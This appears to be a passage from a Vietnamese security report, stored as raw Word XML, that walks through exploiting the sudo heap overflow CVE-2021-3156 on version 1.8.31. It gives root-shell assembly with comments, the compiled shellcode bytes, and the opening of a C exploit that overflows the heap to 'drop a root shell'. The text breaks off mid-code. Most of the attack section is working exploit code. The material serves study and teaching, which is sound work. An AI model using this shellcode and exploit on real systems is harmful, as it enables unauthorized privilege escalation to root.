    <w:p w14:paraId="5B475A00" w14:textId="223B0C09" w:rsidR="00337416" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Kiểm tra phiên bản Sudo</w:t>
      </w:r>
      <w:r w:rsidR="00A8252C" w:rsidRPr="00A8252C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174C3642" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="00A8252C" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Trang </w:t>
      </w:r>
      <w:r w:rsidR="007B3B03">
        <w:t>Tiến hành kiểm tra phiên bản sudo hiện tại trên hệ thống bằng lệnh sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23596474" w14:textId="61CA2EB5" w:rsidR="00A8252C" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Sudo --version</w:t>
      </w:r>
      <w:r w:rsidR="00A8252C">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7A6D1C" w14:textId="5EEECD9A" w:rsidR="00A8252C" w:rsidRDefault="007B3B03" w:rsidP="00A8252C">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="0A5267D6" wp14:editId="16663CE2">
            <wp:extent cx="5327015" cy="1575435"/>
            <wp:effectExtent l="0" t="0" r="698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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5327015" cy="1575435"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7CC642" w14:textId="70EB75E7" w:rsidR="00A8252C" w:rsidRDefault="00A8252C" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="40" w:name="_Toc184042060"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007B3B03">
        <w:t>Phiên bản Sudo</w:t>
      </w:r>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p w14:paraId="06742071" w14:textId="44DAA2A7" w:rsidR="00A8252C" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r w:rsidRPr="007B3B03">
        <w:t>Kết quả cho thấy hệ thống đang sử dụng phiên bản sudo 1.8.31. Đây là phiên bản thuộc phạm vi bị ảnh hưởng bởi lỗ hổng bảo mật CVE-2021-3156, cho phép kẻ tấn công thực hiện leo thang đặc quyền (Local Privilege Escalation).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C71B566" w14:textId="17D6F252" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r w:rsidRPr="007B3B03">
        <w:t>Tạo mã khai thác chứa shellcode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E91C32" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Trong quá trình khai thác lỗ hổng CVE-2021-3156, một trong những bước quan trọng là leo thang đặc quyền để có quyền truy cập root trên hệ thống mục tiêu. Để thực hiện điều này, chúng ta có thể sử dụng mã hợp ngữ (assembly) nhằm thiết lập giá trị setuid và setgid thành 0, qua đó cấp quyền root cho tiến trình đang thực thi. Mã hợp ngữ dưới đây được thiết kế để đạt được mục đích này và thực thi một shell với quyền root thông qua /bin/sh.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EB74A5" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t>push   rbp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E6A68D"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>rbp,rsp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7B902312" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t>add    rsp,0x40</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639E5E0D"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rax,0x69     </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> syscall setuid(0) - Đặt UID của tiến trình thành 0 (quyền root)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8B03F2"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rdi,0x0      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Đối số của setuid là 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06414693" w14:textId="098F2598" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">syscall             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Gọi syscall để thay đổi UID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113D2775"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rax,0x6a     </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> syscall setgid(0) - Đặt GID của tiến trình thành 0 (quyền root)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721F73DD"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rdi,0x0      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Đối số của setgid là 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7317DC4A" w14:textId="3EC43E19" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">syscall             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Gọi syscall để thay đổi GID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756AF91E"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rax,0x3b     </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> syscall execve("/bin/sh", NULL, NULL) - Thực thi shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E3E604" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t>movabs rdi,0x68732f6e69622</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>f  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Địa chỉ của chuỗi "/bin/sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FBF381"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push   rdi          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Đẩy địa chỉ của chuỗi vào stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B983B6"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>rdi,rsp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">        ; Lưu trữ địa chỉ của chuỗi vào thanh ghi rdi (đối số của execve)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFED408"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rdx,0x0      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Đối số thứ ba của execve (biến môi trường) là NULL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A18F492"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push   rdx          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Đẩy NULL vào stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6B71B0"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push   rdi          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Đẩy địa chỉ của "/bin/sh" vào stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F52EF3"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>rsi,rsp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">        ; Lưu trữ địa chỉ của các đối số vào thanh ghi rsi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AB80E3" w14:textId="36824600" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">syscall             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Gọi syscall execve để thực thi shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697C7501"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rax,0x3c     </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> syscall exit(0) - Thoát với mã lỗi 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A1A0D2"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mov    rdi,0x0      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Đối số của exit là 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A382FC"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syscall             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Gọi syscall để thoát chương trình</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E4F090"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nop                 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> No Operation (đặt chỗ)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61ED972E"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pop    rbp          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Khôi phục giá trị của rbp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CDBBDD" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">ret                 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Quay lại từ hàm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201582A5" w14:textId="25C4067B" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:color w:val="007BB8"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Để mã Assembly trên có thể được sử dụng trong các cuộc tấn công, cần phải biên dịch mã này thành shellcode. Việc biên dịch mã hợp ngữ thành shellcode có thể được thực hiện thông qua các công cụ trực tuyến: </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:anchor="disassembly" w:history="1">
        <w:r w:rsidRPr="00E20B82">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://defuse.ca/online-x86-assembler.htm#disassembly</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2575E714" w14:textId="7109955A" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:color w:val="007BB8"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="17B3A039" wp14:editId="61166E5E">
            <wp:extent cx="5265420" cy="3182620"/>
            <wp:effectExtent l="0" t="0" r="7620" b="254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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5265420" cy="3182620"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B21DB8B" w14:textId="0633D560" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="_Toc184042061"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007B3B03">
        <w:t>Chuỗi shellcode được trích xuất sau khi biên dịch assembly</w:t>
      </w:r>
      <w:bookmarkEnd w:id="41"/>
    </w:p>
    <w:p w14:paraId="3CFDAFD0" w14:textId="48461B5D" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="851"/>
      </w:pPr>
      <w:r>
        <w:t>Ta được chuỗi shellcode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4E86F1" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t>\x55\x48\x89\xe5\x48\x83\xc4\x40\x48\xc7\xc0\x69\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05\x48\xc7\xc0\x6a\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3b\x00\x00\x00\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\x48\xc7\xc2\x00\x00\x00\x00\x52\x57\x48\x89\xe6\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05\x90\x5d\xc3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FE3252" w14:textId="35EE1DC9" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Cho chuỗi shellcode trên vào 1 file C để thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3FF0FB" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="1E325E3B" wp14:editId="0F781DB2">
            <wp:extent cx="5758815" cy="1580394"/>
            <wp:effectExtent l="0" t="0" r="0" b="12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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5758815" cy="1580394"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="172551EC" w14:textId="35916FCA" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="42" w:name="_Toc184042062"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007B3B03">
        <w:t>Mã thực thi chứa shellcode (shellcode.c)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w14:paraId="1C30B105" w14:textId="1C667B00" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r w:rsidRPr="007B3B03">
        <w:lastRenderedPageBreak/>
        <w:t>Tạo mã khai thác để gây tràn heap-base</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C642791" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Ta cần chuẩn bị một mã thực thi nhằm gây ra sự tràn bộ đệm trên heap. Mã này sẽ ghi đè lên các cấu trúc quan trọng trong heap, tạo điều kiện để chiếm quyền kiểm soát hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494E9F85"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#include &lt;unistd.h&gt; // </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>execve(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684A93D8"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#include &lt;string.h&gt; // </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>strcat(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1016C034" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53D85299" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t>/* Exploit for CVE-2021-3156, drops a root shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE58AE7"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All credit for original research: Qualys Research Team.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0E9927"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https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34167A2F"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
    <w:p w14:paraId="5D5A3138"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Tested on Ubuntu 20.04 against sudo 1.8.31</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681F0A82"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Author: Max Kamper</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E2FCEA"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
    <w:p w14:paraId="640D4EC2" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D9359B1" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t>void main(void) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E4C6BF" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BA97983"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'buf' size determines size of overflowing chunk.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA74E2F"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This will allocate an 0xf0-sized chunk before the target service_user struct.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506F58BC"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int i;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAC0148"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buf[0xf0] = {0};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BA10F5"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memset(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>buf, 'Y', 0xe0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64294CC3"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strcat(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>buf, "\\");</w:t>
      </w:r>
